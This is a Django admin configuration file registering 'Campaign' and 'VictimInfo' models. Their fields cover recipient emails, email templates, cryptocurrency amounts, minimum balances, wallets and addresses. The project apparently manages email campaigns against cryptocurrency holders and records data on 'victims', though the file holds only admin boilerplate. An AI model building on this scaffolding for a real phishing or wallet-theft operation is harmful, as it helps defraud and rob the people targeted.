# Register your models here.
from django.contrib import admin
from .models import Campaign, VictimInfo

@admin.register(Campaign)
class CampaignAdmin(admin.ModelAdmin):
    list_display = ('user', 'recipient_email', 'email_template', 'cryptocurrency', 'quantity', 'min_balance', 'xp_cost', 'created_at')
    search_fields = ('recipient_email', 'user__username', 'cryptocurrency')
    list_filter = ('email_template', 'cryptocurrency', 'created_at')
    readonly_fields = ('created_at',)

@admin.register(VictimInfo)
class VictimInfoAdmin(admin.ModelAdmin):
    list_display = ('user', 'wallet', 'recipient_email', 'address', 'created_at')
    search_fields = ('recipient_email', 'user__username', 'wallet')
    list_filter = ('wallet', 'created_at')
    readonly_fields = ('created_at',)
